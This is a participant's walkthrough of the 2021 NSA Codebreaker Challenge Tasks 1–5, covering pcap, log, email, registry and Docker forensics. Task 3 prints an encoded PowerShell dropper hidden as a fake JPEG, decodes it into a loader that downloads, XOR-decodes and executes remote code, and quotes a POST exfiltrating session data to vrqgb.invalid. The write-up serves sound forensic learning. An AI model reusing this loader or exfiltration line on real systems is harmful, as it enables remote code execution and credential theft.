# Overview
 The 2021 Codebreaker Challenge consists of a series of tasks that are worth a varying amount of points based upon their difficulty. Schools will be ranked according to the total number of points accumulated by their students. Solutions may be submitted at any time for the duration of the Challenge.

While not required, we recommend that you solve tasks in order, since they flow with the storyline. Later tasks may rely on artifacts / inputs from earlier tasks.

Each task in this year's challenge will require a range of skills. We need you to call upon all of your technical expertise, your intuition, and your common sense. 


## Task 1: Network Forensics, Command Line
The NSA Cybersecurity Collaboration Center has a mission to prevent and eradicate threats to the US Defense Industrial Base (DIB). Based on information sharing agreements with several DIB companies, we need to determine if any of those companies are communicating with the actor's infrastructure.

You have been provided a capture of data en route to the listening post as well as a list of DIB company IP ranges. Identify any IPs associated with the DIB that have communicated with the LP. 

Files:
* `capture.pcap`
* `ip_ranges.txt`

First, I opened `capture.pcap` using Wireshark. Then, it was a simple filter to see which IP(s) had interactions. Using the filter `ip.addr == XX.XX.XX.XX/XX` for each CIDR notation will show which IP addresses interacted with the LP. 

![Wireshark](https://i.imgur.com/MsIdGPz.png)

## Task 2: Log Analysis
NSA notified FBI, which notified the potentially-compromised DIB Companies. The companies reported the compromise to the Defense Cyber Crime Center (DC3). One of them, Online Operations and Production Services (OOPS) requested FBI assistance. At the request of the FBI, we've agreed to partner with them in order to continue the investigation and understand the compromise.

OOPS is a cloud containerization provider that acts as a one-stop shop for hosting and launching all sorts of containers -- rkt, Docker, Hyper-V, and more. They have provided us with logs from their network proxy and domain controller that coincide with the time that their traffic to the cyber actor's listening post was captured.

Identify the logon ID of the user session that communicated with the malicious LP (i.e.: on the machine that sent the beacon *and* active at the time the beacon was sent). 

Files:
* `oops_subnet.txt`
* `proxy.log`
* `logins.json`

To be honest, this task was a bit painstaking for me. I'm sure there was an easier way to achieve the goal, but for me, it was more trial and error and going one-by-one until I found the right result. First, I opened `proxy.log` to find which IP address was interacting with the LP. From Task 1, we know the LP to be '10.180.170.84' because that is the IP address that all IP ranges from Task 1 interacted with. So, we can simply search for '10.180.170.84' in `proxy.log`, and we  will see:

```
2021-03-16 08:36:11 38 172.28.245.238 200 TCP_MISS 12734 479 GET http tcthy.invalid chairman - - DIRECT 10.180.170.84 application/octet-stream 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' PROXIED none - 172.28.245.54 SG-HTTP-Service - none -
```

The first thing that came to my mind was to look for '172.28.245.238', however, that yielded 108 results, and I did not feel like sifting for hours through JSON data. If we take a look at the `logins.json` file, we will notice timestamps are as follows: '"TimeCreated": "2021-03-16T12:20:44.9171085+00:00"'. So, I started by looking for the string '2021-03-16T08' in the logins file, to see if any users were active at the time. However, there were no results. This had me a bit stumped, so then I assumed it could be 24H time; therefore, T20, rather than T08. This provided results, but none using the '172.28.245.238' remote address. So, I then compared `logins.json` to `proxy.log`, and noticed that the timestamps are different. The first result in `proxy.log` is at 06:45:45 and in `logins.json` at 10:42:49. So there is a ~4 hour difference. I then looped back to `capture.pcap` and filtered by `http.request.method == "GET"` to find the GET request to 'tcthy.invalid', which shows an Epoch timestamp of '1615897943.847900000', or '2021-03-16T12:36:11'. 

So, now I had the proper timestamp to be looking for. We know the remote address has to be '172.28.245.238' and the user had to be active at '2021-03-16T12:36:11'. 

This took a bit of sifting through data and timestamps, but I was able to find:
```json
{"PayloadData1": "Target: OOPS\\reinoso.barbara", "PayloadData2": "LogonType 3", "PayloadData3": "LogonId: 0X386CF8", "MapDescription": "An account was logged off", "ChunkNumber": 0, "Computer": "OOPS-DC.oops.net", "Payload": "{\"EventData\": {\"Data\": [{\"@Name\": \"TargetUserSid\", \"#text\": \"S-1-5-21-8182753-126455048-1978990350-1100\"}, {\"@Name\": \"TargetUserName\", \"#text\": \"reinoso.barbara\"}, {\"@Name\": \"TargetDomainName\", \"#text\": \"OOPS\"}, {\"@Name\": \"TargetLogonId\", \"#text\": \"0X386CF8\"}, {\"@Name\": \"LogonType\", \"#text\": \"3\"}]}}", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "EventId": 4634, "EventRecordId": "6428", "ProcessId": 693, "ThreadId": 7836, "Level": "LogAlways", "Keywords": "Audit success", "SourceFile": "C:\\Windows\\system32\\winevt\\Logs\\Security.evtx", "ExtraDataOffset": 0, "HiddenRecord": false, "TimeCreated": "2021-03-16T14:24:38.0887578+00:00", "RecordNumber": "6428"}
```
The user `reinoso.barbara` with LogonID of `0X386CF8` was active on the remote address '172.28.245.238' (The IP address that made the request to the LP) up until 14:24:38, which was after the request was made. 

## Task 3: Email Analysis
With the provided information, OOPS was quickly able to identify the employee associated with the account. During the incident response interview, the user mentioned that they would have been checking email around the time that the communication occurred. They don't remember anything particularly weird from earlier, but it was a few weeks back, so they're not sure. OOPS has provided a subset of the user's inbox from the day of the communication.

Identify the message ID of the malicious email and the targeted server. 

Files:
* `email.zip`

I began by unzipping the `email.zip` archive, and it shows 23 EML files. I began going through each file, simply by opening it up using MacOS's Mail app. This could be done by any application that supports email clients, such as Thunderbird, etc. A few of the emails contain attachments, such as images, PowerPoints, and Spreadhseets, but specifically, `message_9.eml` contains 3 images, one of which does not properly display in the mail client. I saved the file, `sam1.jpg` and ran some file analysis on it. Using `file sam1.jpg` we see: `sam1.jpg: ASCII text, with very long lines, with no line terminators`, which shows that it is indeed not actually a JPEG file. I then used `cat sam1.jpg` to see the contents of the file, and received a very intriguing response:
```
powershell -nop -noni -w Hidden -enc JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AdABjAHQAaAB5AC4AaQBuAHYAYQBsAGkAZAAvAGMAaABhAGkAcgBtAGEAbgAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADEANwAzAAoACgAkAGQAZQBjACAAPQAgACQAKABmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABiAHkAdABlAHMALgBsAGUAbgBnAHQAaAA7ACAAJABpACsAKwApACAAewAKACAAIAAgACAAJABwAHIAZQB2ACAAPQAgACQAYgB5AHQAZQBzAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAHAAcgBlAHYACgAgACAAIAAgACQAcAByAGUAdgAKAH0AKQAKAAoAaQBlAHgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjACkAKQAKAA==
```
So `message_9.eml` is obviously the malicious email, so opening it with any text editor, we will see the message ID is `<161585571500.22130.11520738994728587539@oops.net>`. Okay, 1/2 done. No we need to figure out the domain name of the server that received the POST request. Let's start by decoding the obvious base64 using `echo JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AdABjAHQAaAB5AC4AaQBuAHYAYQBsAGkAZAAvAGMAaABhAGkAcgBtAGEAbgAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADEANwAzAAoACgAkAGQAZQBjACAAPQAgACQAKABmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABiAHkAdABlAHMALgBsAGUAbgBnAHQAaAA7ACAAJABpACsAKwApACAAewAKACAAIAAgACAAJABwAHIAZQB2ACAAPQAgACQAYgB5AHQAZQBzAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAHAAcgBlAHYACgAgACAAIAAgACQAcAByAGUAdgAKAH0AKQAKAAoAaQBlAHgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjACkAKQAKAA== | base64 --decode` and we get:
```powershell
$bytes = (New-Object Net.WebClient).DownloadData('http://tcthy.invalid/chairman')

$prev = [byte] 173

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})

iex([System.Text.Encoding]::UTF8.GetString($dec))
```

I actually have never even looked at PowerShell before this challenge, so this was a bit tricky for me to understand. To start, I analyzed the arguments of the PowerShell command. `-nop` is the same as `-noProfile`, `-noni` is the same as `-nonInteractive`, and `-w Hidden` is the same as `-windowStyle hidden`. All of these arguments create an invisible PowerShell script, that no user would suspect of running. Okay, so this is definitely the malicious email attachment, but it isn't making a POST request, it's only making a GET request to 'http://tcthy.invalid/chairman'. We know that this PowerShell code is taking data from the URL and storing it into an array, and then looping the array and encoding it into UTF-8 to generate a string, and then iex(), which will run whatever the string is. Since the PowerShell made a GET request to that URL, we can simply analyze `capture.pcap` again, and 'File > Export Objects > HTTP > chairman > Save' which will save a file, `chairman`, containing the data needed to properly execute the PowerShell script. All we have to do is make a slight modification to the PowerShell code. Rather than setting $bytes to the HTTP data of that URL, we can use `$bytes = [System.IO.File]::ReadAllBytes('chairman')`

All in all, we will have the following: `sam1.ps1`:
```powershell
$bytes = [System.IO.File]::ReadAllBytes('chairman')

$prev = [byte] 173

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})

Write-Output([System.Text.Encoding]::UTF8.GetString($dec))
#iex([System.Text.Encoding]::UTF8.GetString($dec))
```

We can then execute this PowerShell file to output the expression being invoked by iex(). Running `pwsh sam1.ps1`  will output another PowerShell script, and we will see `Invoke-WebRequest -uri http://vrqgb.invalid:8080 -Method Post -Body $global:log`, at the very bottom, which is our POST request being made to `vrqgb.invalid`. *I saved the PowerShell script generated from `sam1.ps1` as `malicious.ps1` for future-use in later tasks.*

## Task 4: PowerShell, Registry Analysis
A number of OOPS employees fell victim to the same attack, and we need to figure out what's been compromised! Examine the malware more closely to understand what it's doing. Then, use these artifacts to determine which account on the OOPS network has been compromised. 

Files:
* `artifacts.zip`

Extracting `artifacts.zip` reveals a bunch of PuTTY public and private keys, and a `NTUSER.DAT` file. If we analyze `malicious.ps1`, we notice that the code is extracting active WinSCP, PuTTY, and RDP sessions from all users in the current hive. Per TechWalla; "The registry is divided into sections known in Microsoft terminology as hives, and the ntuser. dat file is a copy of the data stored in the registry hive for a specific user, organized in a set of hives called HKEY_USERS. When you are logged in, your user hive can be found in the registry as HKEY_CURRENT_USER." It turns out viewing Windows registry files is insanely hard to do on MacOS. I first tried a Java application called RegeditEx, which allowed me to view the directories, but I wasn't able to view any key pair values. I then tried PyRegEdit, but I wasn't able to install the dependencies it required as it's 8 years old. So, I booted up Kali and used the already installed 'Hivexsh' tool, which allows you to view and modify Windows Registry files. Running `hivexsh NTUSER.dat` allows you to interact with the file just like normal Linux file system. You can use `cd` to move around and `ls` to list files. If we take a look at the PowerShell script, we notice it gets active sessions from:
```powershell
  $PuTTYPathEnding = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $WinSCPPathEnding = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
```
Since we're looking for PuTTY sessions, let's go to that directory. We simply run `cd Software\SimonTatham\PuTTY\Sessions` and we are given the PuTTY sessions that were active at the time. This reduces our options to 5 machines. Now we have to reduce it to one. 
![Hivexsh](https://i.imgur.com/faehbiN.png)

Our options are dkr_prd16, dkr_prd24, dkr_prd71, dkr_prd80, and dkr_tst07. We have to figure out which machine the attacker would be able to access. I then began analyzing the PuTTY private key files, starting with `dkr_prd16.ppk`:
```
PuTTY-User-Key-File-2: ssh-rsa
Encryption: aes256-cbc
Comment: __COMP1__
Public-Lines: 6
AAAAB3NzaC1yc2EAAAABJQAAAQEAiAftVqF4iJdXq+y6qnpfFWJCfGirnA3ITHlH
x67fTGNMHI/8aziKO/DSgvqbg1T0Fam83MSFsdtqgaPXhvG4oLFAqKyomOTmsy2l
ja7zpOB8YnCya78pnRip5zDaz9tIXZOSvS/7Ak7OT70V3JV28EgkwsgVTN83eF7J
L9i3p0+CAaNUxYv63p3hc4pL4U+O7CuBCOaxSYCM/opZiauLCrxCuWcJd4rLfv5s
99/3Frx5/Bed1uJxZlk5sMa5VRAtYJLfiLqHFJpsmfJ0v0pbISAYMi+uk1drpBWR
qNEUurwME/U7lyeyveYHPEctwczFgvEf+uT4+iV2YqQFlCjvfQ==
Private-Lines: 14
ZFLMFmJiQ95RW0j0zlXDHHBP/DvBk+2GRdgeDz4TxTY5Nfy4oqL2WjL1jaaUOSa4
NUOss9e7ZjConu7COEcIOOJKj9DgqyyFhXmF730I7QmjJkVp2WzzlQipoxe4/t8W
yDOEpafOEDNnerBlnQ2UBt3ayxdu3YUP1DSMTaEz7PQNRPK5g3kT8YMSp2PluS1Z
PxltbeQ8gkEX0Z6Y8+3u7r939qmLyvkpS0pKgFIjmk9CnX3TuH20+GmEd7XXk16U
kryG6eaLGy27EB9CYt+WmXRSpWntdQwqCS1REwubcQETJ5YYf6PwZzHUWErG8o1f
j2rG4tW741KfxWc5dGkkJdwN09gXFNydIzQvIndMuFZtnm3nI9LWFeSeJUPicE6R
11Kr3p9JwejZMw+thAmAtuOixY9NT5M6886xZG/lfiWCRXspDa/PgakPFeNeKC5f
Aim10Agu0SbDu7bwtObr56kggCOUSGECNwrtod5Rd3duxeO/+dPi3Z3KJoOzEAUr
vuUwISyuSkLNdtb7sH1SqxShoXnkD85dDoBpqlSgBJb5zoh5vzLqaXWVKYsSvY4f
PG59UwQj/EPIaKCle+X28os/0Efh8xwrLspgR5dR08/cF9HxneguRVJu1LSvOQ2M
zx35OsCZa56dItSxIQhqRnh4YAKMzSYq+iPRe3AHxgmGIXbJfGjlM888Xt2iXJej
djb+Ueh6j8JXeFTiqfqZ+l8LpLahxvN4Midl+yANEWZc7ulpmW/zi/u2KwApcOb1
xoK3KGQ4ZeinM4u4f1eW8mcXEOZb+8J9r8UYzr9kMeQYv3+QZsECxpI7IidQVuUJ
XZkBL923Uk4eT/ACb0lLgOsTmTHqr/+VTr8uASIBuBZ9jaKuBi7YrXcVATGZ0L4r
Private-MAC: cc925b7288219c35ffc0080fc3976b090e957c10
```
The first thing that stood out to me was the Encryption: 'AES256-CBC'. An attacker would want to attack a device with no encryption. So, I went through all of the .PPK files for the machines that had active PuTTY sessions, and when I got to `dkr_prd80.ppk`, I noticed: 'Encryption: none'. There we go, we know the attacker attacked that machine. If we head back to Hivexsh, we can use `cd dkr_prd80` and then `lsval` to list all of the keypairs. At the very top, we will see one specific value: '"HostName"="hypervbot@dkr_prd80"'. So we now have the username, `hypervbot` and the machine, `dkr_prd80`. 

## Task 5: Docker Analysis
A forensic analysis of the server you identified reveals suspicious logons shortly after the malicious emails were sent. Looks like the actor moved deeper into OOPS' network. Yikes.

The server in question maintains OOPS' Docker image registry, which is populated with images created by OOPS clients. The images are all still there (phew!), but one of them has a recent modification date: an image created by the Prevention of Adversarial Network Intrusions Conglomerate (PANIC).

Due to the nature of PANIC's work, they have a close partnership with the FBI. They've also long been a target of both government and corporate espionage, and they invest heavily in security measures to prevent access to their proprietary information and source code.

The FBI, having previously worked with PANIC, have taken the lead in contacting them. The FBI notified PANIC of the potential compromise and reminded them to make a report to DC3. During conversations with PANIC, the FBI learned that the image in question is part of their nightly build and test pipeline. PANIC reported that nightly build and regression tests had been taking longer than usual, but they assumed it was due to resourcing constraints on OOPS' end. PANIC consented to OOPS providing FBI with a copy of the Docker image in question.

Analyze the provided Docker image and identify the actor's techniques. 

Files:
* `image.tar`

I started by unzipping the `image.tar` file and analyzing all the files within it. In the `63a520e0f57025e1b1168dca2316143f7d1fdb00d2b2d29c4f400549b67865c9.json` file, you can already see the answer to the first question, '"maintainer": "carlson.debra@panic.invalid"'. Next, we need to find which repository is cloned via Git. This can be done two ways; either loading the Docker image and actually running it, or just by analyzing the files yourself. Because I didn't want to mess with Docker, I decided to just analyze the file system. In the `repositories` file, we notice '"latest":"6f5fde26cde9fde9a94e4026745b49a6c2af80a7cd51a71ebcfd11c0d04db552"', so we can start with that folder. If we extract `6f5fde26cde9fde9a94e4026745b49a6c2af80a7cd51a71ebcfd11c0d04db552/layer.tar`, we will see `usr/local/src/build_test.sh` and we will also see the answer to question #2: 'git clone https://git-svr-45.prod.panic.invalid/hydraSquirrel/hydraSquirrel.git repo'. All we have to do now is is find the malicious file. Taking a look at `build_test.sh`:
```sh
#!/bin/bash

git clone https://git-svr-45.prod.panic.invalid/hydraSquirrel/hydraSquirrel.git repo

cd /usr/local/src/repo

./autogen.sh

make -j 4 install

make check
```
These are all of the commands ran when the Docker image is loaded. There are only 5 commands, so one of these has to be malicious. It starts with a git clone of the hydraSquirrel repository into a `/repo/` folder, and then cd's into that folder. Then, `autogen.sh` is ran, and then two make commands. Because the repo repository does not exist in the current file system, `/usr/local/src/repo/autogen.sh` cannot be the malicious file because it doesn't exist. A key hint is also given by the prompt: "PANIC reported that nightly build and regression tests had been taking longer than usual," so we know that something is causing the builds to take longer, such as an increased file size. The malicious command is either the `git` or `make`. So, let's check make out. If we go to `f9128527ef00a03558d6a486bcc37653a5c1ec88469b18610220305bcdc7d0b3/layer/usr/bin`, we can see `make` is 8.7MB. Interesting. Now let's compare that to the `usr/bin/make` file on our host system (For me, MacOS. This applies to any Unix based OS, though). We can run `cd /usr/bin` and then `ls -lh` to see that `make` is only 134KB by default. With this, we can confidently say that `/usr/bin/make` is the malicious file, as it has obviously been tampared with-- apparent from the increased file size compared to the default `make` file. 
